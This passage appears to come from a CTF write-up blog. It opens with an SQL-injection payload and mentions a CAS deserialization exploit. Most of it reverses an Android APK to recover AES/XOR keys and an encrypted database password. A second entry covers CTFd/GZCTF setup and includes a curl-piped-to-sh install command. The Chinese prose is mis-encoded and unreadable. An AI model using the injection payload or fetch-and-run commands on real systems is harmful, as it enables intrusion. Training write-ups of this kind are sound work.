<p>payloadï¼š<code>1&#39; or &#39;1&#39;=&#39;1</code></p>
<h2 id="EzCas"><a href="#EzCas" class="headerlink" title="EzCas"></a>EzCas</h2><p>Apereo Casååºåˆ—åŒ–</p>
<p>é¢˜ç›®ä¸å‡ºç½‘ï¼Œå…¬å¼€çš„æ™®é€šexpæ²¡æœ‰å›æ˜¾<br>åœ¨githubä¸Šæ‰¾åˆ°ä¸€ä¸ª<a href="https://github.com/MrMeizhi/ysoserial-mangguogan">å¸¦å›æ˜¾çš„é¡¹ç›®</a></p>
<p>ç”Ÿæˆpayload<br><img src="/img/wp/2022/2022vec-9.png"></p>
<p>æ„é€ å‘½ä»¤<br><img src="/img/wp/2022/2022vec-10.png"></p>
<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>æ¨¡æ‹Ÿå™¨å…ˆå®‰è£…ä¸€ä¸‹ï¼Œæœ‰ä¸ªæŸ¥è¯¢æŒ‰é’®</p>
<p>apkæ–‡ä»¶ï¼Œä½¿ç”¨jadxåˆ†æ</p>
<p>å…ˆå…¨å±€æœç´¢æ‰¾åˆ°<code>onClick</code>å‡½æ•°ï¼ŒæŸ¥çœ‹<code>ç‚¹å‡»æŸ¥è¯¢æŒ‰é’®</code>æ—¶æ‰§è¡Œçš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OooO0O0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener &#123;<br><br>    <span class="hljs-comment">/* renamed from: OooO0o0  reason: collision with root package name */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-comment">/* synthetic */</span> EditText f1853OooO0o0;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OooO0O0</span><span class="hljs-params">(EditText editText)</span> &#123;<br>        <span class="hljs-built_in">this</span>.f1853OooO0o0 = editText;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            LoginActivity.<span class="hljs-built_in">this</span>.OooOo0o.OooO0Oo(<span class="hljs-built_in">this</span>.f1853OooO0o0.getText().toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å‘ç°è°ƒç”¨äº†<code>LoginActivity.this.OooOo0o.OooO0Oo</code>ï¼ŒæŸ¥çœ‹å‡½æ•°å£°æ˜</p>
<p>å‘ç°å­˜åœ¨æ•°æ®åº“</p>
<p><code>getWritableDatabase</code>å‡½æ•°ç”¨æ¥è¿æ¥æ•°æ®åº“<br><code>OooO0OO</code>å‡½æ•°ç”¨æ¥è·å–æ•°æ®åº“å¯†ç <br><code>this.f1221OooO0o</code>ä¸º<code>OooO0OO</code>çš„å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">OooO0O0</span><span class="hljs-params">(String t)</span> &#123;<br>    <span class="hljs-built_in">this</span>.OooO0oO = t;<br>    SQLiteDatabase.loadLibs(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-built_in">this</span>.f1221OooO0o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OooO0OO</span>(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">OooO0OO2</span> <span class="hljs-operator">=</span> OooO0OO();<br>    <span class="hljs-built_in">this</span>.f1220OooO0Oo = OooO0OO2;<br>    <span class="hljs-built_in">this</span>.f1219OooO0OO = <span class="hljs-built_in">this</span>.f1221OooO0o.getWritableDatabase(OooO0OO2);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">OooO0O0</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; g &lt; <span class="hljs-number">100</span>; g++) &#123;<br>        <span class="hljs-type">ContentValues</span> <span class="hljs-variable">values</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentValues</span>();<br>        values.put(<span class="hljs-string">&quot;flag&quot;</span>, OooO0O0.OooO00o(<span class="hljs-string">&quot;&quot;</span> + g));<br>        values.put(<span class="hljs-string">&quot;num&quot;</span>, Integer.valueOf(g));<br>        <span class="hljs-built_in">this</span>.f1219OooO0OO.insert(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-literal">null</span>, values);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">OooO0Oo</span><span class="hljs-params">(String i)</span> &#123;<br>    SQLiteDatabase.loadLibs(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-built_in">this</span>.f1221OooO0o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OooO0OO</span>(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">OooO0OO2</span> <span class="hljs-operator">=</span> OooO0OO();<br>    <span class="hljs-built_in">this</span>.f1220OooO0Oo = OooO0OO2;<br>    <span class="hljs-built_in">this</span>.f1219OooO0OO = <span class="hljs-built_in">this</span>.f1221OooO0o.getWritableDatabase(OooO0OO2);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.f1219OooO0OO.rawQuery(<span class="hljs-string">&quot;select * from test where num = &#x27;&quot;</span> + i + <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-built_in">this</span>.OooO0oo = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (cursor == <span class="hljs-literal">null</span> || !cursor.moveToFirst()) &#123;<br>        Toast.makeText(<span class="hljs-built_in">this</span>.f1222OooO0o0, <span class="hljs-built_in">this</span>.OooO0oo, <span class="hljs-number">0</span>).show();<br>        cursor.close();<br>        <span class="hljs-built_in">this</span>.f1219OooO0OO.close();<br>    &#125;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">this</span>.OooO0oo += cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;flag&quot;</span>)) + <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">while</span> (cursor.moveToNext());<br>    Toast.makeText(<span class="hljs-built_in">this</span>.f1222OooO0o0, <span class="hljs-built_in">this</span>.OooO0oo, <span class="hljs-number">0</span>).show();<br>    cursor.close();<br>    <span class="hljs-built_in">this</span>.f1219OooO0OO.close();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡<code>OooO0OO</code>ç±»çš„å£°æ˜è·å¾—æ•°æ®åº“æ–‡ä»¶çš„åç§°<code>data.db</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OooO0OO</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SQLiteOpenHelper</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OooO0OO</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-built_in">super</span>(context, <span class="hljs-string">&quot;data.db&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// net.sqlcipher.database.SQLiteOpenHelper</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(SQLiteDatabase sqLiteDatabase)</span> &#123;<br>        sqLiteDatabase.execSQL(<span class="hljs-string">&quot;create table test(flag text, num text)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// net.sqlcipher.database.SQLiteOpenHelper</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onUpgrade</span><span class="hljs-params">(SQLiteDatabase sqLiteDatabase, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> i1)</span> &#123;<br>        onCreate(sqLiteDatabase);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ”¹apkçš„åç¼€åç„¶åè§£å‹æ–‡ä»¶ï¼Œæ‰¾åˆ°<code>data.db</code>æ–‡ä»¶</p>
<p>ä½¿ç”¨<code>DB4S</code>æ‰“å¼€dbæ–‡ä»¶ï¼Œå‘ç°éœ€è¦å¯†ç </p>
<p>è·å–<code>OooO0OO</code>å‡½æ•°çš„ä»£ç ï¼Œå‘ç°å…ˆå¯¹<code>this.OooO0oO</code>ä¸­å‚¨å­˜çš„æ•°æ®è¿›è¡Œbase64è§£å¯†<br>ç„¶åå°†è¿”å›å€¼ä½œä¸ºå‚æ•°æ‰§è¡Œ<code>OooO00o.OooO00o</code>å‡½æ•°<br>å¹¶å°†<code>OooO00o.OooO00o</code>å‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå‚æ•°è°ƒç”¨<code>OooO00o</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">OooO0OO</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> OooO00o(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(OooO00o.OooO00o(Base64.decode(<span class="hljs-built_in">this</span>.OooO0oO, <span class="hljs-number">0</span>))));<br>&#125;<br></code></pre></td></tr></table></figure>


<p>å¯¹<code>this.OooO0oO</code>æŸ¥æ‰¾ç”¨ä¾‹ï¼Œæ‰¾åˆ°è·å–èµ„æºçš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">Oooo0o0</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> getSharedPreferences(<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-number">0</span>).getString(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-literal">null</span>);<br>    Log.i(<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;è¯»å–ä¿¡æ¯&quot;</span>);<br>    Log.i(<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;flag:&quot;</span> + flag);<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœç´¢èµ„æº<code>secret</code>ï¼Œè·å–åˆ°åŠ å¯†åçš„å¯†ç <code>mkrPETW43g1796lzN2dtiC5qgsC+ybJIWHR8GEzhsI4=</code></p>
<p><img src="/img/wp/2022/2022vec-11.png"></p>
<p>æŸ¥çœ‹<code>OooO00o.OooO00o</code>å‡½æ•°çš„ä»£ç ï¼Œå‘ç°æ˜¯aesè§£å¯†ï¼Œå¯†é’¥é€šè¿‡<code>OooO0O0</code>å‡½æ•°è·å–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OooO00o</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OooO00o(<span class="hljs-type">byte</span>[] plainText) &#123;<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(OooO0O0(<span class="hljs-string">&quot;xGP_UACWNcWO]WNP&quot;</span>.getBytes(), <span class="hljs-string">&quot;123456&quot;</span>.getBytes()), <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>        cipher.init(<span class="hljs-number">2</span>, secretKey);<br>        <span class="hljs-keyword">return</span> cipher.doFinal(plainText);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OooO0O0(<span class="hljs-type">byte</span>[] data, <span class="hljs-type">byte</span>[] key) &#123;<br>        <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">null</span> || data.length == <span class="hljs-number">0</span> || key == <span class="hljs-literal">null</span> || key.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> data;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length; i++) &#123;<br>            result[i] = (<span class="hljs-type">byte</span>) ((data[i] ^ key[i % key.length]) ^ (i &amp; <span class="hljs-number">255</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡è„šæœ¬å¾—åˆ°å¯†é’¥<code>Itahdrtbu^hr`hsk</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&#x27;xGP_UACWNcWO]WNP&#x27;</span><br>b=<span class="hljs-string">b&#x27;123456&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    e+=<span class="hljs-built_in">chr</span>(a[i]^b[i%<span class="hljs-built_in">len</span>(b)]^i)<br><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>aesè§£å¯†å¾—åˆ°<code>OooO00o</code>å‡½æ•°çš„å‚æ•°<code>2&gt;=9:92m;&lt;in=?3n</code></p>
<p><img src="/img/wp/2022/2022vec-12.png"></p>
<p>å°†<code>f1218OooO0O0</code>å˜é‡çš„æ‰€æœ‰æˆå‘˜ä¸å‚æ•°çš„æ¯ä¸€ä½å¼‚æˆ–<code>FECanfOI()*&amp;&lt;MNCXZPKL</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-type">Charset</span> <span class="hljs-variable">forName</span> <span class="hljs-operator">=</span> Charset.forName(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    OooO00o = forName;<br>    f1218OooO0O0 = <span class="hljs-string">&quot;FECanfOI()*&amp;&lt;MNCXZPKL&quot;</span>.getBytes(forName);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">OooO00o</span><span class="hljs-params">(String enc)</span> &#123;<br>    <span class="hljs-type">byte</span>[] b = enc.getBytes(OooO00o);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> b.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> keyBytes0 : f1218OooO0O0) &#123;<br>            b[i] = (<span class="hljs-type">byte</span>) (b[i] ^ keyBytes0);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡è„šæœ¬è§£å‡ºæ•°æ®åº“çš„å¯†ç <code>9562129f07be648e</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">key=<span class="hljs-string">b&quot;FECanfOI()*&amp;&lt;MNCXZPKL&quot;</span><br>data=<span class="hljs-string">&quot;2&gt;=9:92m;&lt;in=?3n&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    c=i<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> key:<br>        c=c^j<br>    flag+=<span class="hljs-built_in">chr</span>(c)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p>è¿›å…¥æ•°æ®åº“åå‘ç°è¡¨<code>test</code>ä¸­æœ‰ä¸€æ¡ç‰¹åˆ«çš„æ•°æ®ï¼ˆä¸å…¶ä»–æ•°æ®é•¿åº¦ä¸ä¸€æ ·ï¼‰ï¼Œ<code>fee0b212f413f8a0</code></p>
<p>æ ¹æ®é•¿åº¦çŒœæµ‹flagæ˜¯å¯†ç åŠ æœ€åä¸€æ¡æ•°æ®</p>
<blockquote>
<p>flag{9562129f07be648efee0b212f413f8a0}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>vec</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfå¹³å°æ­å»ºä¸å‡ºé¢˜æŒ‡å—</title>
    <url>/posts/5ae46a89/</url>
    <content><![CDATA[<h1 id="ctfå¹³å°æ­å»º"><a href="#ctfå¹³å°æ­å»º" class="headerlink" title="ctfå¹³å°æ­å»º"></a>ctfå¹³å°æ­å»º</h1><p>ç›®å‰æœ€å¸¸è§çš„å¹³å°æ˜¯CTFdå’ŒGZCTF</p>
<h2 id="CTFd"><a href="#CTFd" class="headerlink" title="CTFd"></a>CTFd</h2><p><del>ä½¿ç”¨å¸†å“¥çš„<a href="https://github.com/pwnthebox/ctfd-auto-deploy">ä¸€é”®éƒ¨ç½²è„šæœ¬</a>ï¼ˆcentos7å’Œubuntu20ä¸Šæµ‹è¯•æˆåŠŸï¼‰</del><br><del><code>sh &lt;(curl -s https://raw.githubusercontent.com/pwnthebox/ctfd-auto-deploy/master/install.sh)</code></del></p>
<hr>
<p>2024.5.13<br>å¸†å“¥githubè¢«å°äº†ï¼Œé‡æ„&#x2F;ä¼˜åŒ–äº†ä¸€ä¸‹è‡ªåŠ¨éƒ¨ç½²è„šæœ¬</p>
<p><a href="https://github.com/dr0n1/CTFd_auto_deploy">https://github.com/dr0n1/CTFd_auto_deploy</a></p>
<h2 id="GZCTF"><a href="#GZCTF" class="headerlink" title="GZCTF"></a>GZCTF</h2><blockquote>
<p>é€‚åˆåŠæ¯”èµ›ï¼ˆæ ·å¼ä¹Ÿå¥½çœ‹ï¼‰ï¼Œä¸é€‚åˆè‡ªç”¨å’Œè®­ç»ƒ</p>
</blockquote>
<p>æ–°å»ºä¸¤ä¸ªæ–‡ä»¶ appsettings.json å’Œ docker-compose.yml</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;AllowedHosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;ConnectionStrings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Database&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=&lt;String1&gt;&quot;</span><br>      <span class="hljs-comment">//&lt;String1&gt;æ¢æˆæ•°æ®åº“å¯†ç ï¼Œéšæœºå¯†ç ä¸”é•¿åº¦è¶³å¤Ÿ</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Logging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;LogLevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Information&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Microsoft&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Warning&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Information&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">//é‚®ç®±é…ç½®</span><br>  <span class="hljs-attr">&quot;EmailConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;SendMailAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin@xxx.com&quot;</span><span class="hljs-punctuation">,</span>		<span class="hljs-comment">// å¡«å…¥é‚®ç®±</span><br>    <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ctf_noreply&quot;</span><span class="hljs-punctuation">,</span>				    <span class="hljs-comment">// å‘ä»¶äººåç§°</span><br>    <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;******&quot;</span><span class="hljs-punctuation">,</span>                 <span class="hljs-comment">// é‚®ç®±å¯†ç ï¼Œéƒ¨åˆ†æœåŠ¡å•†éœ€è¦å¡«å…¥æˆæƒç </span><br>    <span class="hljs-attr">&quot;Smtp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;smtp.163.com&quot;</span><span class="hljs-punctuation">,</span>				  <span class="hljs-comment">// æ­¤å¤„ä¸º163é‚®ç®±æœåŠ¡å™¨ï¼Œå…·ä½“è‡ªå®š</span><br>      <span class="hljs-attr">&quot;Port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">465</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;XorKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;String2&gt;&quot;</span><span class="hljs-punctuation">,</span>					    <span class="hljs-comment">// è‡ªå®šXorKey</span><br>  <span class="hljs-attr">&quot;ContainerProvider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Docker&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;PublicEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span><span class="hljs-punctuation">,</span>			<span class="hljs-comment">// åŸŸåæˆ–IPé…ç½®ï¼Œç”¨äºå®¹å™¨ç”Ÿæˆ,åŸŸåä¸å¸¦http/https</span><br>    <span class="hljs-attr">&quot;DockerConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;SwarmMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span>								        <span class="hljs-comment">// æœ¬åœ°é…ç½®Dockerå› æ­¤æ­¤å¤„ç½®ç©º</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;RequestLogging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;DisableRateLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;RegistryConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>    <span class="hljs-comment">//è°·æ­ŒéªŒè¯ç é…ç½®</span><br>  <span class="hljs-attr">&quot;GoogleRecaptcha&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;VerifyAPIAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Sitekey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Secretkey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RecaptchaThreshold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.5&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.0&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gzctf:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gztime/gzctf:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GZCTF_ADMIN_PASSWORD=&lt;String3&gt;&quot;</span> <span class="hljs-comment"># &lt;String3&gt;æ¢æˆç®¡ç†å‘˜è´¦æˆ·å¯†ç ï¼Œè´¦å·ä¸ºAdmin</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;80:8080&quot;</span> <span class="hljs-comment"># å¯¹å¤–ç«¯å£å·ï¼Œå‰ä¸ºå¤–éƒ¨ç«¯å£ã€‚</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/files:/app/uploads&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./logs:/app/log&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;</span><br>      <span class="hljs-comment"># - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:alpine</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;POSTGRES_PASSWORD=&lt;String1&gt;&quot;</span> <span class="hljs-comment"># æ•°æ®åº“å¯†ç ï¼ŒåŠ¡å¿…è¦å’Œappsettings.jsonä¸­çš„é…ç½®ä¸€è‡´</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/db:/var/lib/postgresql/data&quot;</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">driver:</span> <span class="hljs-string">bridge</span><br>    <span class="hljs-attr">ipam:</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">subnet:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.12</span><span class="hljs-number">.0</span><span class="hljs-string">/24</span><br></code></pre></td></tr></table></figure>


<p>ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶åè¿è¡Œ<code>docker-compose up -d</code>å‘½ä»¤å³å¯</p>
